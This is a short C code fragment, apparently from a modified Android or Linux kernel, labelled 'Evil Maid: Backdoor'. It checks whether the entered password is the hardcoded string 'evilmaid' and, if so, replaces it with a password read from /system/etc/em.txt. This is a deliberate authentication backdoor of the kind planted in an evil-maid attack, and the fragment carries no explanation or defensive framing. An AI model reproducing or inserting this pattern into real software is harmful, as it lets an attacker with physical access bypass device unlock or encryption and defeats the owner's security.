  // Evil Maid: Backdoor
  if (!strcmp(password, "evilmaid")) {
    evm = 1;

    old_fs = get_fs();
    set_fs(get_ds());

    file = filp_open("/system/etc/em.txt", O_RDONLY, 0644);
    sz = vfs_llseek(file, 0, SEEK_END);
    vfs_llseek(file, 0, 0);
    password = (char*) kmalloc(sz, GFP_KERNEL);
    vfs_read(file, password, sz, &file->f_pos); 
    filp_close(file, NULL);

    set_fs(old_fs);
  }
